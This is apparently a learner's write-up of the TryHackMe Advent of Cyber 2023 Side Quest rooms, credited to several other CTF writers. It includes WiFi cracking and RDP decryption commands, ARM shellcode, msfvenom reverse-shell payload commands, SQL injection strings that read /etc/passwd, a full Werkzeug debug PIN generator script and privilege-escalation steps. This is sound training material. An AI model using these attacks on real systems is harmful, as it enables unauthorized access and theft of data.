# Advent-Of-Cyber-2023-Side-Quest Through

Name: Advent-Of-Cyber-2023-Side-Quest
Date:  
Difficulty: Insane  
Goals:  
- Learn from the amazing people that actually did this in few weeks available
- Points of the THM eternal point maw
- A reason to fix cheatsheets
- A reason to learn more OSINT and fix my paralysis in some areas
- How to approach these types of puzzle
- Every piece of new information I learn I provide a bonus  one up or alternative or something helpful too
Learnt:
Beyond Root:
- Read all the writeups and learn all the things

- [[Advent-Of-Cyber-2023-Side-Quest-Notes.md]]
- [[Advent-Of-Cyber-2023-Side-Quest-CMD-by-CMDs.md]]

During December of 2023 I realised I could not do this puzzle. The rabbithole would ruin my plans and figuring out what I needed to do. I really wanted to do it, but I also did not have a team. The only thing I did was type:

Yeti, Bandit and Advent in the search terms to find three of the rooms, but I came across the day 3 room through 0xb0b:

[Side Quest Room](https://tryhackme.com/room/adventofcyber23sidequest)
[Day 1](https://tryhackme.com/room/adv3nt0fdbopsjcap)
[Day 2](https://tryhackme.com/room/armageddon2r)
[Day 3](https://tryhackme.com/room/busyvimfrosteau)
[Day 4](https://tryhackme.com/room/surfingyetiiscomingtotown)


## Writeups Used and Profiles Listed

Profile names as links to Writeup - What I learnt from them
- [bakiba](https://github.com/bakiba/AOC-2023-SideQuest/tree/main/First%20Side%20Quest%20-%20The%20Story), [nouman404](https://nouman404.github.io/CTFs/TryHackMe/AdventOfCyber2023/SideQuest_Day1) and [pL4sTiC1337](https://github.com/pL4sTiC1337/ctf-writeups/blob/main/thm/aoc2023-sidequests/returnoftheyeti.md) used [https://github.com/GoSecure/pyrdp](https://github.com/GoSecure/pyrdp) - amazing tool!
- [nouman404](https://nouman404.github.io/CTFs/TryHackMe/AdventOfCyber2023/SideQuest_Day1) for 
	- `aircrack-ng` alternative with hashcat from [cyberark](https://www.cyberark.com/resources/threat-research-blog/cracking-wifi-at-scale-with-one-simple-trick)
- [0xb0b](https://0xb0b.gitbook.io/writeups/tryhackme/2023/advent-of-cyber-23-side-quest/the-return-of-the-yeti), for `aircrack-ng` to crack wifi passwords we need a .pcap format
- [Gh05t-1337](https://github.com/Gh05t-1337/CTF-Writeups/tree/main/TryHackMe/AoC23%20Sidequest/1%20The%20Return%20of%20the%20Yeti), decrypting using Wireshark
-  [0xb0b](https://0xb0b.gitbook.io/writeups/tryhackme/2023/advent-of-cyber-23-side-quest/frosteau-busy-with-vim#getting-to-sq3-the-qr-code): [Wikipedia - ACropalypse](https://en.wikipedia.org/wiki/ACropalypse) 
#### [The Return of the Yeti](https://tryhackme.com/room/adv3nt0fdbopsjcap)

I have never done any WIFI capture so I guessed the first answer:
![](tyoy-1.png)
What's the name of the WiFi network in the PCAP?
```
FreeWifiBFC
```

Now we need to look for a authentication packet. I have not done enough of this so time for learning. From [0xb0b](https://0xb0b.gitbook.io/writeups/tryhackme/2023/advent-of-cyber-23-side-quest/the-return-of-the-yeti), for `aircrack-ng` to crack wifi passwords we need a .pcap format

[Gh05t-1337](https://github.com/Gh05t-1337/CTF-Writeups/tree/main/TryHackMe/AoC23%20Sidequest/1%20The%20Return%20of%20the%20Yeti) points out we can do the same with WireShark
-  `Edit > Preferences > Protocols > IEEE 802.11, and Edit Decryption keys`

```bash
# Crack wifi passwords from pcap
aircrack-ng $file.pcap -w /usr/share/wordlists/rockyou.txt 
# Decrypt encrypted wifi traffic
airdecap-ng $file.pcap -e <SSID> -p <PASSWORD>
# Creates a $file-dec.pcap
```

![](keyfound.png)

![](decapng.png)
We get `VanSpy-dec.pcap` file to view in Wieshark with everything decrypted

![](toolanswer.png)

[unit42.paloaltonetwork decryption rdp traffic](https://unit42.paloaltonetworks.com/wireshark-tutorial-decrypting-rdp-traffic/)

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("/users/administrator/LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx"))
```

```powershell
$base64String = "<INSERT Base64 ENCODED PFX>"
# Convert the Base64 string back to bytes
$bytes = [System.Convert]::FromBase64String($base64String)

# Save the bytes to a file
Set-Content -Path "<YOUR PATH>\file.pfx" -Value $bytes -Encoding Byte
```

Or you could to save time like I did :`https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%252B/%253D',false,false)&input=` and then save file

[seguranca - Extraction certs/private keys from Windows using mimikatz and intercepting calls with burpsuite](https://gitbook.seguranca-informatica.pt/credentials-exfiltration/extracting-certs-private-keys-from-windows-using-mimikatz-and-intercepting-calls-with-burpsuite)

```bash
openssl pkcs12 -in $file.pfx -nocerts -out $key.pem -nodes
openssl rsa 0in $key.pem -out $key.key
```
In WireShark:`Edit -> Preferences→Protocols -> TLS→Edit… (RSA keys list)`
- IP 
- Set protocol to `tpkt` and the port to `3389`
- Add the `$key.key` file above

![](rdptraffic.png)

Replay RDP traffic:
`File -> Export PDUs to File...`, under `Display filter:` type `rdp` and select `OSI layer 7`

[bakiba](https://github.com/bakiba/AOC-2023-SideQuest/tree/main/First%20Side%20Quest%20-%20The%20Story), [nouman404](https://nouman404.github.io/CTFs/TryHackMe/AdventOfCyber2023/SideQuest_Day1) and [pL4sTiC1337](https://github.com/pL4sTiC1337/ctf-writeups/blob/main/thm/aoc2023-sidequests/returnoftheyeti.md) used [https://github.com/GoSecure/pyrdp](https://github.com/GoSecure/pyrdp) which is replay RDP traffic from `$file.pcap` tool.

```bash
python3 -m venv 
source 
cd pyrdp/
pip install .
cd ../
python pyrdp-convert.py --list-only ../rdp_pdus.pcap
python3 pyrdp/pyrdp/bin/convert.py -o py_rdp_output rdp_pdu.pcap
# Then use docker to view the rdp playback
sudo docker run -v "$PWD/py_rdp_output:/pwd" -e DISPLAY=$DISPLAY -e QT_X11_NO_MITSHM=1 --net=host gosecure/pyrdp pyrdp-player`
```

I noticed there were slightly less packets for some reason... and my py_rdp_output did not work. I used [mabsimmo](https://medium.com/@mabsimmo/thm-advent-of-cyber-2023-side-quest-1-7f3a7fb5d6be) to finish this off. 
- Packet 17870 for the case id
- Packet 35547 I copy the dump to a file and remember that it starts with 1- 

```
cat yetikey1.txt | awk -F. '{print $2$3$4$5$6$7$8$9$10$11$12}' | tr -d '\n'
```

## [Snowy ARMageddon](https://tryhackme.com/room/armageddon2r)

[GrepMoreCoffee](https://github.com/JoanneBiltz/CTF-Writeups/tree/main/2023_THM_AOC_Side_Quests/Snowy_ARMageddon) and [0xb0b](https://0xb0b.gitbook.io/writeups/tryhackme/2023/advent-of-cyber-23-side-quest/snowy-armageddon) point out that previous requirement to gain the QR code from my favourite room from the AoC 2023 Game hacking room which this year was a Buffer Overflow. For my the very visual and new context of seeing a buffer overflow was very satisfying to me. But, this is 2024. I am doing this to learn from and highlight others to get the badge, experience different Hacking and InfoSec domains while I finish some projects and not get burnt out doing the HTB Season 4.  

Port scanning the machine we have ssh, telnet, a HTTP web server with instant 403 forbidden and a 50628 tcp port for...
![](nmapforARMingyouday2.png)

Trivision:
![](trivisionconnectprotectandbufferoverflow.png)
A quick `searchsploit`
![](day2searchsploitnoexploit.png)
Dorking it - key takeaway being trying different variations
![](dorkingtheexploitforthecamera.png)
[sumanrox](https://github.com/sumanrox/sidequest-exploits/tree/main/sidequest_2) has a automated exploit for this so I will test it only after I have read everyone else writeups that are GitHub. This exploit is very sexy. Good code and the nice visuals.
![](coolexploit.png)

Because they have made this so easy. I wanted to review and finish [nosqlinjectiontutorial](https://tryhackme.com/room/nosqlinjectiontutorial) from THM. After doing this.

```asm
mov r1, #0xc1   // store '193' in R1
lsl r1, #8      // shift by 8 bits to the left
add r1, #0x03   // add '3' to R1
lsl r1, #8      // shift by 8 bits to the left
add r1, #0x0b   // add '11' to R1
lsl r1, #8      // shift by 8 bits to the left
add r1, #0x08   // add '8' and '2' to R1 (since we cannot pass the hex value for 10 '0x0a')
add r1, #0x02
push {r1}
```
[beta-j](https://github.com/beta-j/TryHackMe-Rooms/blob/main/AoC%202023%20-%20SideQuest%202%20-%20Snowy%20ARMageddon.md) discusses the use of [https://shell-storm.org/online/Online-Assembler-and-Disassembler/](https://shell-storm.org/online/Online-Assembler-and-Disassembler)
```plaintext
\xc1\x10\xa0\xe3\x01\x14\xa0\xe1\x03\x10\x81\xe2\x01\x14\xa0\xe1\x0b\x10\x81\xe2\x01\x14\xa0\xe1\x08\x10\x81\xe2\x04\x10\x2d\xe5
```

Assembling my own version with [https://shell-storm.org/online/Online-Assembler-and-Disassembler/](https://shell-storm.org/online/Online-Assembler-and-Disassembler):
![](nicetoolonlinetool.png)

After issues, concentration dip and time management concerns I decide over lunch to, given how good this auto-exploits are, analyse them as the Beyond Root and figure out and copy some of the cool tricks they utilise for H4dd1xb4dg3r recon tool wrapper   

## [Frosteau's Busy with Vim](https://tryhackme.com/room/busyvimfrosteau)

While testing nuclei to see if it return any information if any about the Day 2 Web Camera exploit I stumbled on [0xb0b](https://0xb0b.gitbook.io/writeups/tryhackme/2023/advent-of-cyber-23-side-quest/frosteau-busy-with-vim#getting-to-sq3-the-qr-code) explanation of day 3, which I was missing. Apparently Day 3 is a secret challenge inside of Day 17's AoC 2023.


![](admindesktopday3.png)

![](chatlogs.png)

![](gimpforwindows.png)

![](snipandsketchvuln.png)

[Wikipedia - ACropalypse](https://en.wikipedia.org/wiki/ACropalypse) *(CVE 2023-21036) was a vulnerability in Markup, a [screenshot](https://en.wikipedia.org/wiki/Screenshot "Screenshot") editing tool introduced in [Google Pixel](https://en.wikipedia.org/wiki/Google_Pixel "Google Pixel") phones with the release of [Android Pie](https://en.wikipedia.org/wiki/Android_Pie "Android Pie"). The vulnerability, discovered in 2023 by security researchers Simon Aarons and David Buchanan, allows an attacker to view an [uncropped](https://en.wikipedia.org/wiki/Cropping_(image) "Cropping (image)") and unaltered version of a screenshot. Following aCropalypse's discovery, a similar [zero-day](https://en.wikipedia.org/wiki/Zero-day_(computing) "Zero-day (computing)")[[1]](https://en.wikipedia.org/wiki/ACropalypse#cite_note-1) vulnerability was also discovered, affecting [Snip & Sketch](https://en.wikipedia.org/wiki/Snip_%26_Sketch "Snip & Sketch") for [Windows 10](https://en.wikipedia.org/wiki/Windows_10 "Windows 10") and [Snipping Tool](https://en.wikipedia.org/wiki/Snipping_Tool "Snipping Tool") for [Windows 11](https://en.wikipedia.org/wiki/Windows_11 "Windows 11").*

[frankthetank-music - Acropalypse-Multi-Tool](https://github.com/frankthetank-music/Acropalypse-Multi-Tool) can *easily detect and restore Acropalypse vulnerable PNG and GIF files with simple Python GUI.*

![1080](0xb0brecroppingtoreveal.png)

![](nmapday3.png)

![](ftpanon.png)

For some reason `wget -r ` did not work.
![](flag2isaenv.png)
frostling_base
![](frostling_base.png)

frostling_five
![](frostling_five.png)

yeti_footage
![](yeti_footage.png)

yeti_mugshot
![](yeti_mugshot.png)

The wonderful Christmas Joke of escaping from Vi
![](telnettoaviproc.png)
I tried
```
:set shell=/bin/sh
:shell
```

BEfore losing my mind and rabbitholing in dev week:
![](beforerabbithioleindevweek.png)

[GrepMoreCoffee](https://github.com/JoanneBiltz/CTF-Writeups/tree/main/2023_THM_AOC_Side_Quests/frosteau_busy_with_vim) found that 
```
-If you exit vim you are kicked out of the connection.
-You can see the directories inside vim using `:e /` then `:e /directory_name`.
-Trying to run commands using :! from vim gives an error `Cannot execute shell /tmp/sh`. 
-After looking through many files and directories we determined that /tmp/sh was empty and not executable. 
-There is also a user frosty that has /usr/frosty/sh that is empty but is executable. We might be able to use that to get a shell.
-If you go to the /home directory you will find the user ubuntu.
-We tried all kinds of shells in vim but didn't have any luck.
-We can set permissions with `:call setfperm("/tmp/sh","rwxrwxrwx")`.
-`:e /etc/shells` gives us `/usr/busybox/sh`.
-It seems the 8065 port points to `/usr/frosty/sh`.
# What we then need to do:
-Create your payload using `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o payload.elf`.
-Start your listener in `msfconsole` and use `payload/linux/x64/meterpreter/reverse_tcp`, then `set hosts YOUR_IP`.
-ftp to 8075 and upload the payload.elf file.
-telnet to 8095 to use nano to open the payload.elf file at /tmp/ftp/payload.elf and save to /usr/frosry/sh.
-telnet to 8065 and you will now have a meterpreter session. Use sessions -i 1 to get the meterpreter prompt.
```

She then creates a msfvenom shell and uploads via FTP
![](grepnomorerabbitholes.png)

[BatBato](https://nouman404.github.io/CTFs/TryHackMe/AdventOfCyber2023/SideQuest_Day3#foothold)'s solution was to upload Linux binaries  
![](batosolutiontotheshellday3issue.png)

![](changeofname.png)

Sometimes just doing what you are told is a good idea to get things done.
![](weareinacontainer.png)

Just because I am trying to develop stuff and hopeful find a bug in some application this year with Docker Containers I decide for the Docker Escape I would not use Writeups. The interesting part of this machine is there a lack of binaries for utility on this machine and there is no user other than `ubuntu`, but we are:
![](butwearealreadyroot.png)
and therefore:
![](flag3day3.png)
```ruby
cat /proc/1/cgroup # No docker 
ls sbin # has chroot
```

![](devrootrootroot.png)

Added to my Archive repository as I did not have this:
```bash
ps | grep dockerd 
```

As we have the process we can view the `/proc/`
![](dockerd.png)

Like so:
![](proc1215root.png)

`ls`-ing the host root directory: 
![](finalday3flagandyeti.png)

## [The Bandit Surfer](https://tryhackme.com/room/surfingyetiiscomingtotown)

The auto-exploit code is so inspiring and interesting just skimming the length of it I learnt about python:
- `argparse` code in a try, if try, except, and any addition try,except block when some part of the attack chain is done  `if __name__ = "__main__":`
	- reduces function calls, script size and keeps the discourse to that block instead of main()
- Simple checks for big consequences
	- `isAlive()`
- I have worked with `sub.process` I could do this
- `re` and `requests` are the only packages you really need with that I have personal issues with
	- Worrying about too much specificity on request made and recieved and the how, when, what, etc
	- `re`: I is great but at some points I have found my scripting with bash faster so taking the time to worry about `re` has always meant that in weighting up of my time that python as a language and its use cases for me have sat in weird edge case zone:
		- Need it for exploits and change modify it and troubleshoot it, but do not want, struggle to or do not have the time to write this kind of code. 

Before I get carried away with my beyond root 4 hour python automation Dev time, by just running the exploit there is [0xb0b](https://0xb0b.gitbook.io/writeups/tryhackme/2023/advent-of-cyber-23-side-quest/the-bandit-surfer), [grepmorecoffee](https://github.com/JoanneBiltz/CTF-Writeups/tree/main/2023_THM_AOC_Side_Quests/the_bandit_surfer), [nouman404](https://nouman404.github.io/CTFs/TryHackMe/AdventOfCyber2023/SideQuest_Day4) and [h3lli0t](https://h3lli0t.github.io/The-Bandit-Surfer-THM/) to read:
- The QR code for this room was in Day 20 machine, in picture of the gitlab instance - `Day_20_calendar.png`
- There is a Union SQL injection where we can retrieve files `UNION SELECT "file:///etc/passwd" -- -` as the files are stored in the database as ID that the backend then calls another function to retrieve the file on disk 
- [nouman404](https://nouman404.github.io/CTFs/TryHackMe/AdventOfCyber2023/SideQuest_Day4#sqli) did `id=0' union select all concat('file:///etc/passwd')-- -`
- ![](sqliforday4.png)
- [h3lli0t](https://h3lli0t.github.io/The-Bandit-Surfer-THM/) used `sqlmap -u "http://10.10.203.181:8000/download?id=" --dbs`, then `'+UNION+SELECT+"file:///etc/passwd"+--+-` in BurpSuite
- Because werkzeug is a python webserver, similar to enumerating a SSTI we need to enumerate our capabilities of exploiting the vulnerability with that of the python functions allowed for the webserver to make by class ids '
- The additional complexity is that need to retrieve the `private_bits` list from `app.py` so we need:
	- `/sys/class/net/<device id>/address` for the MAC address
	- machine-id from `/etc/machine-id`
	- The we need the hashing algorithm and salt use from the initialisation of python3 libraries in this context in mcskiddy's:`$HOME/.local` directory: `/lib/python3.8/site-packages/werkzeug/debug/__init__.py`

[0xb0b 's pin recovery utility script](https://github.com/Nouman404/nouman404.github.io/blob/main/_posts/CTFs/TryHackMe/AdventOfCyber2023/getFiles.sh) 
> *Note that I put the `cron.service` (available in the `cgroup` file). But for some reason, sometimes it worked with it appended to the machine ID and sometimes without. So be aware of that.*

[hdks werkzeug Console PIN Exploit](https://exploit-notes.hdks.org/exploit/web/framework/python/werkzeug-pentesting/), [h3lli0t](https://h3lli0t.github.io/The-Bandit-Surfer-THM/), [0xb0b](https://0xb0b.gitbook.io/writeups/tryhackme/2023/advent-of-cyber-23-side-quest/the-bandit-surfer)'s apparently sometimes-reliable pin cracking script:  
```python
import hashlib
from itertools import chain
probably_public_bits = [
    'mcskidy',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2818051077195',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'aee6189caee449718070b58132f2e4ba'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```
They all were the same and I have no idea whom to credit for it.

For MAC address of the eth0 interface
![](macaddressforday4.png)

![](machineidday4.png)

Checking the reliability myself - it is not a reliable exploit 
```python
02:68:16:8f:de:67 # MAC Address -> 0x
aee6189caee449718070b58132f2e4ba # machine id

# Covert MAC addresses to decimal
mac="02:68:16:8f:de:67";
print(f"0x{mac.replace(':','')}")

```

![](interestingcrackers.png)

This will be the second machine I auto-exploit from the set just to try use breakpoints and debug in VS code. 

![](passinthegits.png)

Regardless of the mistake checking the mysql database was good from remember sql
![](wronigcommit.png)

For root:
- [GitTools](https://github.com/internetwache/GitTools): `gitdumper.sh`, `extractor.sh`
- `git show e9855c8a10cb97c287759f498c3314912b7f4713` - exposed credentials in MySQL conf 
- [grepmorecoffee](https://github.com/JoanneBiltz/CTF-Writeups/tree/main/2023_THM_AOC_Side_Quests/the_bandit_surfer) found mcskiddy's password in the MySQL.conf file: 
```MySQL configuration
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'mcskidy'
app.config['MYSQL_PASSWORD'] = '[REDACTED]'
app.config['MYSQL_DB'] = 'elfimages'
mysql = MySQL(app)```
- `secure_path` environment can run run `/usr/bin/bash /opt/check.sh`, which uses `/opt/.bashrc` (bash run commands) is sourced from the `/opt/check.sh`
- [h3lli0t](https://h3lli0t.github.io/The-Bandit-Surfer-THM/) `[` is actually a command, equivalent to the `test` command.

```bash
msfconsole -x "use /exploit/multi/handler;set payload linux/x64/meterpreter/reverse_tcp;set LHOST tun0;set LPORT 4444;exploit;"

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOURVPNIP LPORT=4445 -f elf -o payload2.elf
```

![](scptorootgrepingallthecoffee.png)

![](changethepermsfool.png)

`[`

![](bashtorootwithweirdcharacters.png)

I am sure I was slightly devastated at Privilege Escalation similar to this on a HTB box. It is a very nasty you just need to know what the pieces are - ie in this case the scripts - do not rabbit hole and ask the question how is it implemented and how do I control what and how it is implemented. It is a nasty Privilege Escalation after a while you can just take for grant a way a human make a file, how bash scripting works, BUT crucially that bash works a particular way and if it is not quotes, it is special CHARACTERS. Therefore to simplify for memorising the crucial information: 
- is it quotes?
- is it special character being parsed by something related to the context 
- have write/draw/noted out the context so that you can step back and be able to apply this everywhere? BECAUSE THIS IS REALLY NASTY PRIVILEGE ESCALATION.  
![](enableexplaination.png)

![](nastyroot.png)

## Post-Completion-Reflection  

- The people that unknowingly contributed to my fast-track exposure to these topics are awesome!
- The first day I could not really add anything useful or helpful I knew basically nothing even though I have done well in packet analysis challenges - LEARNT A LOT
- Sometimes taking the stress out of trying and trying to view the entire CTF or a step without the pain will hopeful increase serious gains.

## Beyond Root

- https://tryhackme.com/room/nosqlinjectiontutorial

- [sumanrox](https://github.com/sumanrox/sidequest-exploits/tree/main/sidequest_2) has a automated exploits - they look cool, work well, not many dependencies!
	- Templating automated exploitation





- Agile HTB is similar Weukzerg exploit: [https://exploit-notes.hdks.org/exploit/web/framework/python/werkzeug-pentesting](https://exploit-notes.hdks.org/exploit/web/framework/python/werkzeug-pentesting)
```python
import hashlib
from itertools import chain
probably_public_bits = [
    'mcskidy',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2818051077195',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'aee6189caee449718070b58132f2e4ba'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```